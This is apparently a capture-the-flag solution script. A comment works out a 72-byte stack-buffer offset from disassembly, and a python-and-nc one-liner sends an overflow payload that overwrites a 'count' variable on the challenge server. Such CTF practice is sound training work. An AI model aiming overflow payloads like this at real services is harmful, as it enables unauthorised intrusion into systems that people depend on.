#!/bin/sh
# Reasoning for 72: Buffer space allocated (seen using objdump -d) = 0x60 = 96 b# ytes. Also, loaded 0x50 = 80 bytes for buffer. Therefore, with rbp-4 storing t# he current rbp value, and rbp - 8  storing the integer value for count, remain# ing = 80 - 8 = 72 bytes, to be used, and beyond that, it will overwrite the co# unt value.

python -c "print 'a' * 72 + '1234'" | nc shell.actf.co 18100
